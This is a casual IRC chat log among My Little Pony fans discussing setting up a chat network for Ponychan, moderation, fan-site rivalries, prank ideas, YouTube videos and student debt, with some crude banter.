<Ghosties> 4About an IRC Chat for Ponychan (that I'm still not completely sure of :S)
<Lambda> XD dari!
<prince-dari> Clear the URL bar, paste that in and press enter.
<Mikey> I was wondering where everyone was all weekend @___@; but then I figured you guys were on memorial day vacation or something
<prince-dari> What do you see? XD
<Mikey> dare I do this
<Ghosties> 4Silver can explain it (please :P)
<Lambda> "PONIES PONIES PONIES PONIES"
<Hipster_Brony> 8so, basically a chat spinoff of Ponychan?
<Lambda> or if you paste the same thing into the main page you can see what I've been drawing
<Mikey> I'm not getting anything
<Silverscreen> 12Yes.
<Mikey> huh
<Lambda> hm
<Hipster_Brony> 8Correct me if I'm wrong, but wouldn't that be complete and utter chaos?
<Mikey> it's not taking me anywhere
<Silverscreen> 12At first.
<prince-dari> It's not meant to.
<Hipster_Brony> 8I mean, we get turbo chat when we have 200 people
<prince-dari> It only works in firefox or chrome.
<Mikey> ...okay?
<Mikey> I'm in firefox
<Hipster_Brony> 8I can only imagine what it would be with all the Ponychan users
<Silverscreen> 12But not if we have separate mane rooms being the same as Ponychan.
<prince-dari> Latest version?
<Mikey> I don't know
<Mikey> I'll try on chrome one min
<Hipster_Brony> 8even so though
<Lambda> go to spyroforum.com, then put that in the url bar and hit enter
<prince-dari> You sure you copied it all right?
<Hipster_Brony> 8I think one of the Ponychan mods said /oat/ alone gets 11,000+ posts per day
<prince-dari> And cleared your URL bar first?
<Lambda> hello
<Mikey> yes
<Mikey> I'm stupid but not that stupid
<prince-dari> But not everyone from ponychan would go on the IRC.
<prince-dari> Also spam filters do exist. :P
<Ghosties> 4Dari said we could get bots to moderate for us, too
<Mikey> hmmm
<prince-dari> Strange.
<Hipster_Brony> 8true, but that kind of volume, even if it was only 25% of users would be insanity
<Mikey> lol omg
<Silverscreen> 12You don't understand how irc can work. There can be mane rooms that branch off into other rooms. for example: the /rp/ room can have links to places like /park/ and /pub/ and /OOC/ and places like /oat/ could have /rarity/ /rainbowdash/ and /nonsense/ rooms attached.
<Soyuz> hai Skylands|Offline
<prince-dari> Haha.
<Soyuz> * Shiny-Growlithe
<Mikey> FOREVER
<prince-dari> http://www.spyroforum.com/user-2204.html
<Shiny-Growlithe> 02Hey
<prince-dari> See RDX's profile page. :P
<Mikey> one minute chrome takes fucking forever to load :C
<Mikey> hahaa
<Silverscreen> 12Each category has sub categories. Each sub category will host different users. With users so wide spread, clumping will only happen in the mane channels.
<prince-dari> You could have separate rooms and a main room, just limit posting to one post every 10 seconds or so per person.
<Soyuz> what iz up
<Silverscreen> 12not to mention that IRC users who know their stuff can make rooms of their own, so that's even more rooms for users to spread out into.
<Silverscreen> 12It'd be no different from any other IRC network. But it's with ponies.
<Hipster_Brony> 8oh, ok
<Hipster_Brony> 8i admit, I know nothing about chatrooms
<Lambda> who's drawing with me right now?
<Mikey> the world may never know
<Lambda> whoever gave spyro a mustache and unibrow that's awesome
<Hipster_Brony> 8well, I am officially never trusting rotten tomatoes for reviews ever again
<Ghosties> 4Yeah, I'm IRC illiterate as well
<prince-dari> I think it was Stormy.
<Hipster_Brony> 8The Room has a 30%
<Silverscreen> 12lol
<Silverscreen> 12See, IRC-ignorant folk like yourself (no offense) would just be able to access the rooms that are advertised in the main channel, but you'd still be branching out. Others like myself would be able to surf through them to the ones we want, even if they aren't there yet.
<Ghosties> 4My only question about the IRC is who would mod it? Us?
<Silverscreen> 12well, I know I'd be able to mod almost 24/7. I have no life.
<Silverscreen> 12And believe me, once a chat is set up and the craze dies, it can get pretty slow on the regular basis.
<Silverscreen> 12....NI!
<Silverscreen> 12...I had to do that.
<Hipster_Brony> 8lol
<drf|away> 03*WB02(FlameLugia02)03WB* - <FlameLugia> Please disregard that I was dropped as a child.
<Hipster_Brony> 8the NI!'s were out of control last week
<Hipster_Brony> 8but i expected as much
<Silverscreen> 12That was hilarious.
<Ghosties> 4Hmm, let's see how the other bronies take to the idea
<Hipster_Brony> 8honestly, that's one of the reasons I love doing this
<Silverscreen> 12I don't mind spams like that. It's hilarious AND it's in context of the rules.
<Hipster_Brony> 8were you going to post this idea on /oat/ or /meta/?
<Silverscreen> 12hmm....not sure. It's barely Pony related, but it wouldn't garner much support if put on /meta/
<Silverscreen> 12I might have to settle on putting it in /chat/
<Hipster_Brony> 8Create it on /oat/
<Hipster_Brony> 8the mods will move it if it isn't pony related enough
<Hipster_Brony> 8but who knows, maybe they will get behind the idea
<Silverscreen> 12Can do. I won't make a fuss if they move it.
<Silverscreen> 12I just want to get the idea out there.
<Hipster_Brony> 8I would be able to mod as well
<Hipster_Brony> 8I'm pretty much on Ponychan all day anyway
<Silverscreen> 12You have no life either?
<HyperMetalLugia> Heya FL :3
<Hipster_Brony> 8nope.avi
<Silverscreen> 12awesome.
<Ray||ZzZzZ> 02Hiya Flame (again)
<Ray||ZzZzZ> 02and what tha...
<Shiny-Growlithe> 02headache
<Hipster_Brony> 8I work from 9 AM to 2 PM, then I mostly sit in my apartment and discuss ponies on the internet
<Hipster_Brony> 8sounds a little sad, but I enjoy iy
<Hipster_Brony> 8it*
<FlameLugia> Ello HML and Ray
<Hipster_Brony> 8and I hope to one day become a mod for Ponychan too...
<Silverscreen> 12I have a max of 4 hours of school. Otherwise I'm in front of my computer. Just as sad. :/
<Silverscreen> 12damn you smiley.
<Silverscreen> 12:\
<prince-dari> Haha, no smilies for me.
*prince-dari doesn't use mibbit.
<Silverscreen> 12I actually prefer mIRC, but I don't feel like bothering to do the whole process of making a new server packet and all that crap.
<Mikey> I love me
<Lambda> I love me too
<Mikey> :P
<Silverscreen> 12....it's quiet.... >.>
<prince-dari> I wonder what's been drawn on google...
<Ghosties> 4I feel...conflicted
<Silverscreen> 12conflicteded?
<Ghosties> 4Yes, conflicteded :P
<prince-dari> Hmm.
<Mikey> look at rdx's open comment box
<Soyuz> D:
<Silverscreen> 12of what?
<prince-dari> LOL
<Lambda> Hahaha
<Lambda> Nice XD
<Ghosties> 4I love the fandom, I really do. But, I feel like if I also become a mod for the IRC chat, that's a big chunk of my daily life right there. I don't mean to be a negative nancy or anything but there's no way in hell that I could ever do it during the fall, even if I decided to help you guys mod during the summer
<Hipster_Brony> 8yeah, it might get a little busier in the fall for me with school
<Hipster_Brony> 8but my lack of a social life and fear of going into bars because concealed firearms are now legal to take in in Ohio helps
<prince-dari> Guns. Not many guns in the UK.
<prince-dari> I like that.
<Armageddon> o-o
<Mikey> brb
<Silverscreen> 12well, most likely we'd have more mods since this thing is on a much bigger scale.
<FlameLugia> Ello Ko
<Hipster_Brony> 8oh yeah, for sure
<Silverscreen> 12If anything, we could postpone actually MAKING the IRC itself until we feel we have enough mods to handle it.
<Ghosties> 4Yes, let's wait
<prince-dari> IRC channels don't get destroyed just because there aren't enough mods though.
<Ghosties> 4My main concern is that I'll feel suffocated
<Hipster_Brony> 8I would float the idea now and build interest for it
<Ghosties> 4and I don't want or need that
<Silverscreen> 12Yeah, but lack of mods is like an invitation for parasprites.
<Hipster_Brony> 8but wait until we have enough mods
<Silverscreen> 12THere's an idea.
<prince-dari> Haha, we had 888chan 'raid' us once.
<prince-dari> They got nowhere with our IRC.
<Hipster_Brony> 8we can pluck some from BMN
<Ghosties> 4Even if we got all the guys from the Movie Night, I still think we'd need much more
<Silverscreen> 12Certainly. We'd need much more.
<Lambda> @quote
<Ghosties> 4We'd definitely have to ask guys like SirSprinkles, Chuckles, Razyn, Lunar, and whoever

<Odysseus> Randomly found the url on equestria daily. o_o;
<prince-dari> People do turn up loads at random times though.
<Odysseus> It had an irc link, and I'm an irc person. ;x
<Hipster_Brony> 8odysseus, you found the post from friday?

<Silverscreen> 12See? we already have IRC people appearing!
<Silverscreen> 12\o/
<prince-dari> Haha.
<prince-dari> Thanks Duane!
<Odysseus> Random google lurking.
<Silverscreen> 12Question, Odysseus, what do you think of having a Pony IRC?
<MtChar> NO
<MtChar> UNACCEPTABLE
<Kosoveon> hello flame ^^ (super, SUPER late xD)
<Kosoveon> long time no see
<prince-dari> He already said he was an IRC person.
*Emmi pokes Aristeo and Jason
<Aristeo> Emmi!!!!!!!!!!!!!!
<Silverscreen> 12I know, so i want his official opinion of this specific IRC.
*Aristeo clings to his girlfriend Emmi
*Ray plays with Kosoveon's tail
<FlameLugia> Hey ko, again lol
<Emmi> o.o
<Emmi> .....
<Kosoveon> and hi ray~
*Emmi coughs
<Emmi> Anyway
<Odysseus> If we're talking IRC networks, unless you have enough people, I wouldn't suggest it. I've owned a few IRC networks related to anime, they don't do well unless you have atleast 100+ people interested. IRC channels? Cheaper (free)
<Emmi> How are you
<Ray> 02:3
<Ray> 02rawr~
<prince-dari> /list
<Silverscreen> 12I was thinking of just starting with a trial channel on this very server.
<Odysseus> Granted, with all the pony websites, a network might work.
<Odysseus> ~_~
<Aristeo> xD
*SilverSonic is back.
<Aristeo> I'm gonna do that from nowon
<Aristeo> I'm okies
<Aristeo> you?
<Odysseus> A great way to connect all the websites.
<Aristeo> Sally!!!!!!!!!!!!!
<Silverscreen> 12I know of Poniberru (however that place is spelled), EQD and Ponychan. What others are there?
*FlameLugia hugs Koso
<Sally> :P hai
<Emmi> not sure i'm "okies" with that..
<Emmi> but..
<MtChar> LIES
<Emmi> ehh
<MtChar> ALL LIES
<Odysseus> Seems to be plenty of little websites with pictures and whatnot.
<Hipster_Brony> 8there's fimChan i think
<Ghosties> 4Good luck on that
<Hipster_Brony> 8never been there though, just heard people talking about it
<Ghosties> 4There's way too much of a difference between FimChan and Ponychan
<Ghosties> 4FimChan pretty much hates Ponychan, and if you combine the two it won't be pretty
<`> Lmao
<Aristeo> :D
<prince-dari> What, because they can't post their porn everywhere? >__>
<SilverSonic> Youre face is a lie
*SilverSonic hides
<Odysseus> I'm sure plenty of subbing groups of rizon hate each other, but it doesn't stop them. ;x
<Ghosties> 4There's more to it than just lack of NSFW on Ponychan
<Aristeo> :O KITTEN IS HERE!
<Aristeo> She must've snuck in!
<Aristeo> KITTEN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
<Hipster_Brony> 8Like I said, I've never been there
<Hipster_Brony> 8i avoid pony rule 34 like the plague
<Ghosties> 4FimChan sees Ponychan as nothing more than a bunch of hugbox love cults that constantly try to circle jerk one another and that they're hypersensitive to the slightest instant of drama
<SilverSonic> Your*
<Ghosties> 4Also, full of hypocrites
<prince-dari> Lol, the only reason I like ponychan is because it's nothing like 4chan.
<Silverscreen> 12I've seen a bit of 4chan and that poniberru place I mentioned. Most of the people there act like complete douchebags.
<MtChar> Oh? If it is a lie.
<MtChar> Then what is it?
<Odysseus> That's most people on the internet, sadly.
<Hipster_Brony> 8I'm a little entertained by some of the stuff 4chan pulls, but not the attacking people and ruining their lives
<prince-dari> Hey Bronypeanut.
<Hipster_Brony> 8i silently cheered them for the wikileaks stuff they did
<Bronypeanut> Hai =D
<Hipster_Brony> 8Suddenly, BronyPeanut
<Silverscreen> 12ISSA PEANUT!
<Silverscreen> 12:o
<Ghosties> 4Hey Peanut
<Silverscreen> 12Odysseus: And that's why my life is spent on Ponychan. XD
<MtChar> what is it
<Odysseus> I try to avoid most the internet these days. T_T
<Ghosties> 4I don't think you'll have a problem getting most Pony sites to fall into IRc
<Silverscreen> 12I focus on avoiding trolls. the internet itself isn't that bad of a place.
<Ghosties> 4*IRC
*Ray sleeps on Flame's head
<Ray> 02z-z
<Odysseus> Then you should go for it.
<Silverscreen> 12What server is this?
<Ghosties> 4Wait, when you guys speak of trolls, like what do you mean?
<FlameLugia> Why does everyone sleep on my head D:
<Hipster_Brony> 8mean-spirited trolls
<Silverscreen> 12People who are complete assholes for the sake of being an asshole to stir others up.
<Odysseus> I'm always for reviving IRC, and getting new people into it would be nice.
<Bronypeanut> 13AHA!
<Bronypeanut> 13I MADE YOU THINK I WAS AFK
<Bronypeanut> 13BECAUSE I WAS
<Bronypeanut> 13Hai everypony

<Silverscreen> 12wat?
<Silverscreen> 12WHAT WHAT IN THE BUTT!
<Ray||ZzZzZ> 02because it's awesome? .-.
<Ghosties> 4I just hope that people don't see FimChan as some place that's just full of trolls, just like I hope that FimChan isn't a place that sees Ponychan as full of hugbox love cults
<Silverscreen> 12....
*Kosoveon hugs flame back
<Bronypeanut> 13I just go to Ponychan

<prince-dari> [03:53] <Hipster_Brony> Some "all in good fun" trolling is awesome - Like making people believe that Brock rapes Ash in pokemon.
<prince-dari> That was funny.
<prince-dari> http://www.youtube.com/watch?v=BuBefhp5aNg
<Hipster_Brony> 8... must have missed that
<Ghosties> 4I don't know, I'm in the middle
<prince-dari> Showed them that, convinced them that it was from a banned episode. XD
<Silverscreen> 12I never seen that thread.
<Hipster_Brony> 8it was in /chat/
<Hipster_Brony> 8I posted in it, but I kind of lost track of it
<Ghosties> 4I'm sure it's been taken down now, but I then started seeing other threads pop up on Ponychan asking about the validity of the "love and tolerance" mantra after that one
<Odysseus> Reminds me of this: http://technolog.msnbc.msn.com/_news/2011/05/30/6750046-fake-harry-potter-news-causes-facebook-freakout
<Silverscreen> 12I seen the others, and I find it hilarious hwo it's always met with five hundred posts of people explaining how the mantra works.
*Okan yawns
<prince-dari> LOL
<prince-dari> Who would believe that?
<Ghosties> 4There's only ever been one true thread that got under my skin on Ponychan
<Hipster_Brony> 8The Onion is my favorite thing of all the things
<Hipster_Brony> 8it was started in my hometown too :)
<Silverscreen> 12Ghotsies: what is that?
<Ghosties> 4The guy who adamantly believes that we could go to Equestria one day
<prince-dari> You sure he's not just trolling...?
<Ghosties> 4No, he was being completely serious
<prince-dari> How do you know?
<Silverscreen> 12....why would that upset you?
<Ghosties> 4He started talking about how multiverse theory would allow it
<Ghosties> 4He gave a concise argument about it and other people, though not all of them, discussed the theory with him
<Odysseus> o-o;
<Ghosties> 4It bothers me because every single one of us here knows that Friendship is Magic is a cartoon
<Ghosties> 4I wouldn't mind if he wasn't being serious
<Odysseus> A cartoon would be the last place I'd want to go. xD
<Ghosties> 4But he pretty much believes in it
<Odysseus> Send me to Universal Century. o_o...
<Silverscreen> 12Well, following his logic, it makes sense, though it's INCREDIBLY hard to follow it.
<Silverscreen> 12I honestly don't see it as a possibility.
<Hipster_Brony> 8I agree, given that all of his assumptions are correct, it would be possible
<Hipster_Brony> 8but that's not to say that they are
<Silverscreen> 12Yeah. Far fetched talk from somepony who watched WAAAY too much Star Trek.
<Ghosties> 4Exactly
<Odysseus> Make him watch the original MLP series. ;x
<Odysseus> He might change his mind.
<Silverscreen> 12lol
<Ghosties> 4That's enough outta me. I don't mean to exacerbate this discussion because I honestly do love the show and I'm all for the bronies

<Mikey> kids are so fucking stupid
<Silverscreen> OHGODMYFUCKINGEYES!
<Mikey> http://www.youtube.com/watch?v=XkYcWzBCEb8&feature=related
<Odysseus> That's a girl mind you.
<Hipster_Brony> 8the RAINBOW DASH ALWAYS DRESSES IN STYLE ones are the worst
<Hipster_Brony> 8because Dash is best pony, and i hate to see her reputation dragged through the mud
<prince-dari> LOL
<Silverscreen> I would agree with you, hipster....
<prince-dari> That first video you posted, the 6 year old at 20 seconds.
<Silverscreen> 'cept for one thing.
<Aristeo> :3
<prince-dari> I swear she says "Look at the titties!"
<Silverscreen> Twilight is best pony.
<Mikey> XDDD
<Silverscreen> :D
<prince-dari> LOL
<prince-dari> The six year old loves it.
<Ghosties> 4Silverscreen
<prince-dari> The older kids hate it.
<Mikey> morgan is a fucking douchebag
<Ghosties> 4Is in white text now
<Mikey> I hate her
<Silverscreen> 11Ghosties?
<Mikey> she's so stupid
<Mikey> no 6 year old is that fucking stupid
<Ghosties> 4WHAT IS THIS TRICKERY?!
<Silverscreen> 11Yeah, I accidentally closed the tab. x.x
<Mikey> why do they have her on there every video
<Odysseus> http://www.youtube.com/watch?v=iCG3ZSCbqr8&feature=player_detailpage#t=512s
<Odysseus> Me hulk, ME MAD GARRR
<prince-dari> Why do they all think that it's "meow".
<prince-dari> IT'S NYAN PEOPLE!
<Hipster_Brony> 8odysseus: nope.avi
<Hipster_Brony> 8Also, Twilight is up there
<Mikey> MORGAN SHUT UP
<Mikey> UGH
<Mikey> FUCK YOU
<Hipster_Brony> 8really close to Dash
<Silverscreen> 11...we should totally pull a troll on one of our streams.
<Hipster_Brony> 8basically because I'm pretty much Twilight IRL
<prince-dari> WHAT
<prince-dari> It's a cupcake?
<prince-dari> NO
<Silverscreen> 11Show a pre-4-gen episode.
<prince-dari> It's A DONUT?
<prince-dari> WHAT?
<Odysseus> e_e
<Hipster_Brony> 8we kind of did
<prince-dari> WHAT IS WRONG WITH THESE PEOPLE
<Hipster_Brony> 8last week
<prince-dari> LOL
<Hipster_Brony> 8with spiderman
<prince-dari> 12 year olds saying "What is this"
<Silverscreen> 11That was a spiderman derail.
<Silverscreen> 11Hardly a troll.
<Silverscreen> 11Hell, everypony LIKED it.
<Ghosties> 4Ghosties is all for a troll episode
<Hipster_Brony> 8i cant abide by showing pre-Gen 4 ponies though
<Silverscreen> 11XD Why?
<Odysseus> That'd kill bronydom. ;x
<Hipster_Brony> 8but other trolling would be awesome
<Hipster_Brony> 8we aren't trying to physically harm people, silver
<Silverscreen> 11...good point. We'd want people to be able to see the next movie.
<Odysseus> That includes never showing the original MLP movie. >.>;
<Ghosties> 4Aww, come on. It'd be a good test to all the bronies
<Hipster_Brony> 8we might honestly lose people though, in all seriousness
<Ghosties> 4Damn, you're right. That could happen
<Silverscreen> 11Do it as a post-show troll then.
<Hipster_Brony> 8if we're gonna troll, it should be something short
<Hipster_Brony> 8I still maintain that we should rickroll everypony at some point
<Ghosties> 4I'll be back in a bit
<Ghosties> 4gotta take my test
<Hipster_Brony> 8alrighty
<prince-dari> Well I am disappoint.
<Silverscreen> 11Oh, I'm for the rickroll as well.
<Hipster_Brony> 8good luck ghosties
<prince-dari> They don't understand nyan cat.
<Mikey> they
<Silverscreen> 11Seeya, Ghosties.
<Mikey> re at that age where they think they look badass for hating on everything
<Silverscreen> 11I'm just saying a pre-gen Ponies troll would be funny to see everypony's reaction.
<prince-dari> Has anyone made a ponyroll yet?
<prince-dari> Because we need one.
<Hipster_Brony> 8god yes
<Hipster_Brony> 8something like this template: http://www.youtube.com/watch?v=wzSVOcgKq04
<Silverscreen> 11...it can be done.
<Silverscreen> 11...that was genius.
<Hipster_Brony> 8oh god, silver, if you could make a ponyroll with clips of the ponies saying the lyrics edited together like that, you would be my hero
<Hipster_Brony> 8i can tell you now it would become a staple of our pre-show
<Odysseus> Flutterguy voice must be included. >.>;
<prince-dari> What.
<Mikey> huh
<Silverscreen> 11I'm no A/V editing expert and it'd take a while, but I could give it a shot. I'd just have to download the vids from youtube, find a rickroll to use with it, and spend hours splicing and matching.
<Silverscreen> 11....sounds fun.
<prince-dari> That 6 year old.
<prince-dari> Wut.
<prince-dari> I think my brain just melted.
<Mikey> the dumb little girl
<Mikey> she needs to just
<Mikey> go away
<Mikey> and never come back
<Silverscreen> 11lol flutterguy
<prince-dari> ...
<prince-dari> What the hell.
<Hipster_Brony> 8if you want to that is
<Silverscreen> 11I need a hobby outside of Ponychan.

<prince-dari> What.
<prince-dari> Keyboard cat.
<Odysseus> Minecraft
<Odysseus> ;x
<prince-dari> It rhymes?

<Silverscreen> 11No.
<Silverscreen> 11A hobby. Not an addictoin.
<Mikey> shes so fucking stupid

<Mikey> even I wasn't that stupid at 6
<Odysseus> Shoujo anime. har-har

<Silverscreen> 11Currently in college. It's fine, I ignore all the parties, drugs, and booze. Kinda why I have no life.
<Hipster_Brony> 8The John Grisham method

<Odysseus> There is no one to talk to in Kentucky *Gough*
<Odysseus> cough*

<Aristeo> "When a tree falls in the forest, does it make a sound? We'll never know, since trees don't fall in this game." <-- That's an awesome sentence
<Odysseus> o_o;
<Odysseus> Legit, or on mute?
<Curly> :p
<prince-dari> Legit, but I was asleep for 5 hours and away for another 10 or so.
<Silverscreen> 11lol
<Odysseus> So 10 hours?
<prince-dari> Yeah.
<Curly> also, something exciting happened today :O
<Silverscreen> 11nice.
<Hipster_Brony> 8i only have a handful of friends here too
<Curly> I was going home and there was a crazy guy in a turban swinging a sword around in the middle of downtown Vancouver
<Hipster_Brony> 8my two roommates, who i'm really close with
<Curly> there were like 20 police officers pointing guns at him
<Proto``> To you that was a crazy guy swinging a sword
<Proto``> To him he was fighting off demons trying to devour your souls!
<Curly> xD
<Proto``> *spooky sounds and stuff*
<Hipster_Brony> 8a guy who graduated last year, and a couple guys from the building over, and thats about it
<Aristeo> ooooooooooh
<Silverscreen> 11My roomates and I only say three things to each other: "Hi" "How are you?" "I forgot my cardkey, can you let me in?"
<Hipster_Brony> 8ah
<Hipster_Brony> 8that's kind of how I was my freshman year
<Curly> they shot at him with rubber bullets and he started running down the street in my direction and everybody in the crowd started scattering
<Hipster_Brony> 8i lived with one of my current roommates
<Chimera> Sayaka wut
*Chimera chews silly Sheena
<Curly> I thought they were actually shooting him because I couldn't really see the police officers >.>
<Sayaka> Sheena's not here O:
<Curly> one of them was carrying a fancy revolver grenade launcher :o
<Silverscreen> 11I'm actually only here for two years, but I am getting my Bacheler's degree from it.
<Chimera> O:
<Curly> and two of them were holding assault rifles
<Hipster_Brony> 8we didn't talk a ton, but I got to know him a little bit, so we roomed together the next year
<Sayaka> O:
*Chimera noms Sayaka instead.
<Hipster_Brony> 8that's where i met my other current roommate, who is basically the polar opposite of me
<Sayaka> Noooo
<Chimera> :3333
<Silverscreen> 11cool.
<Silverscreen> 11Sorry, I'm only a quarter paying attention. I'm tired.
<Hipster_Brony> 8yeah, i need to go to bed soon too, but i have to let one of my roommates in to my new apt
<prince-dari> Hmm, bored. Can't sleep either.
<Hipster_Brony> 8it's only supposed to be me here, but i have an extra bed and his place doesnt have a/c
<Hipster_Brony> 8so im "breaking the rules"
<Hipster_Brony> 8also, you have no idea how much i envy your "bachelor's degree in 2 years"
<Aristeo> >.<
<Aristeo> You're okay, right? :o
<Hipster_Brony> 8i still have 2 years to go and i'm already 50 grand in debt
<Odysseus> There are options at some schools for that. ;x
<RedDragonX> I use it a lot in regular IM's
<Hipster_Brony> 8not a whole lot of schools offer Sports Management as a degree though
<Silverscreen> 11It's not all that great. All breaks are cut severely short.
<prince-dari> Haha, university costs are tripling or something for the year I'll be going.
<prince-dari> Fun.
<Curly> yeah, it was awesome ^^
<Odysseus> If it means less debt, I'm for it. ;x
<Hipster_Brony> 8dari, you're the guy from the UK, right?
<Curly> he was yelling stuff about jedi too >.>
<prince-dari> Yep.
<Hipster_Brony> 8how much does college cost there?
<Silverscreen> 11Like my friend has a 3 month summer vacation. I get two weeks off for mine.
<Curly> when he got taken down and the crowd started clapping he was all like "I HATE YOU ALL! ANAKIN BETRAYED BY THE PEOPLE!"
<Hipster_Brony> 8my summer vacation lasted 2 days...
<Silverscreen> 11damn.
<Hipster_Brony> 8damn this internship
<prince-dari> When I'm going it'll be £9000 ($14,885) a year.
<prince-dari> Then I'll have living expenses on top of that.
<Hipster_Brony> 8damn
<Hipster_Brony> 8you have no idea how much i envy you right now
<Ghosties> 4done
<Odysseus> Student loans... T~T
<Hipster_Brony> 8tell me about it
<Ghosties> 4wow, you guys are still here
<prince-dari> Haha.
<Hipster_Brony> 8of course, we were waiting for you :)
<Odysseus> If I took them, it probably wouldn't bother me much, I don't want a family. However, my career doesn't necessarily need higher education.
<Ghosties> 4Aw, thanks Hipster
<Hipster_Brony> 8ah, i also don't really want a family, but I might have 100k in debt by the time i graduate
<Hipster_Brony> 8thats a lot even for regular living expenses
<Aristeo> Wolves! I found wolves!
<Ghosties> 4Guys, I made a 68 on my first online course exam
<Silverscreen> 11ah, so you're in an internship. That explains it.
<Odysseus> I'm modest, as long as I have a computer, I can live in a one room apartment.
<Silverscreen> 11I'm only doing classes.
<Ghosties> 4I'm...pretty content
<Hipster_Brony> 8nice
<Ghosties> 4I mean, I failed the exam but I literally did no studying what so ever
<Ghosties> 4So if I study next time I should do much better
<Hipster_Brony> 8but yeah, it's an awesome internship, i just wish i could go home
<Hipster_Brony> 8 68 on an exam with no studying?
<Hipster_Brony> 8i'd call that a decent success
<Silverscreen> 11I studied to Equestria Girls for my Art History. Then I kicked flank at it. Like a Boss.
<Hipster_Brony> 8well done, sir
<Odysseus> lmfao
<Ghosties> 4Well, I failed to mention that I was utilizing my notes from previously, the internet, and the "Find" function for my powerpoints, so, I had some help :P
<Silverscreen> 11nice.
<Ghosties> 4But awesome for you, Silver
<Silverscreen> 11thanks.
<Ghosties> 4No problem, man ^_^
<Hipster_Brony> 8unfortunately, ponies have been less kind to my academics
<Odysseus> Rather learn with this: http://www.youtube.com/watch?v=8UqUrRnh0XI&feature=related
<Odysseus> >=I
<Hipster_Brony> 8discovered them in march
<Hipster_Brony> 8semester ended in may
<Ghosties> 4I also discovered ponies in March
<Silverscreen> 11...interesting...
<Ghosties> 4I did fine...save for Biology. But then, I loath science so that's not surprising in the least
<Hipster_Brony> 8still managed a b average, but i was severely neglecting my studies
<Silverscreen> 11Mine was in mid-April.
<prince-dari> Hmm, I got into ponies in March.
<Hipster_Brony> 8oh god, biology
<Odysseus> Discovered them last Friday. >.>;
<Ghosties> 4Oh, it seems like there's a new brony in the chat
<Hipster_Brony> 8welcome to the herd
<Ghosties> 4Welcome indeed, brah
<Silverscreen> 11I'd say welcome, but I'm seriosly in need of sleep. Yawning like crazy over here.
<Odysseus> ;3
<Hipster_Brony> 8go get some sleep then, brony
<Ghosties> 4Shit, I don't have the "Welcome to the herd" picture on hand >_<
<Odysseus> I think I originally watched it out of procrastination, but then I began to appreciate the characters and comedy.
<Odysseus> u_u
<Ghosties> 4Here, I'll use this one instead. Mostly because it makes me laugh :P
